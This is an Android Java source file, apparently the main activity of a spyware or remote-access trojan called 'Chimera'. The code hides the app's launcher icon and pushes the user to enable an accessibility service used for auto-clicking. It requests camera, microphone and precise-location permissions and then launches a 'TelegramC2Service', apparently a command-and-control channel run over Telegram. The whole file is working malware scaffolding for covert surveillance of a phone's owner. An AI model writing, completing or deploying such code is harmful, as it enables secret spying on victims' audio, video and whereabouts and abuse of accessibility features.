package com.chimera;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_CODE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnContinue = findViewById(R.id.btnContinue);
        Button btnHide = findViewById(R.id.btnHide);

        btnContinue.setOnClickListener(v -> requestPerms());

        btnHide.setOnClickListener(v -> {
            try {
                PackageManager pm = getPackageManager();
                ComponentName cn = new ComponentName(MainActivity.this, MainActivity.class);
                pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                Toast.makeText(MainActivity.this, "Icon Hidden", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                ErrorLogger.logError(MainActivity.this, "MainActivity_HideClick", e);
            }
        });
    }

    private void requestPerms() {
        // First, check for Accessibility permission
        if (!AutoClickerAccessibilityService.isServiceEnabled()) {
            Toast.makeText(this, "Please enable the Chimera Service for full functionality", Toast.LENGTH_LONG).show();
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            return; // Wait for user to enable it
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                String[] perms = {
                        Manifest.permission.CAMERA,
                        Manifest.permission.RECORD_AUDIO,
                        Manifest.permission.ACCESS_FINE_LOCATION
                };
                boolean need = false;
                for (String p : perms) {
                    if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                        need = true;
                        break;
                    }
                }
                if (need) {
                    ActivityCompat.requestPermissions(this, perms, REQ_CODE);
                } else {
                    startTelegram();
                }
            } else {
                startTelegram();
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "MainActivity_RequestPerms", e);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            startTelegram();
        }
    }

    private void startTelegram() {
        try {
            startService(new Intent(this, TelegramC2Service.class));
            // The installation message can be sent from the service itself to avoid main thread issues.
            finish();
        } catch (Exception e) {
            ErrorLogger.logError(this, "MainActivity_StartTelegram", e);
        }
    }
}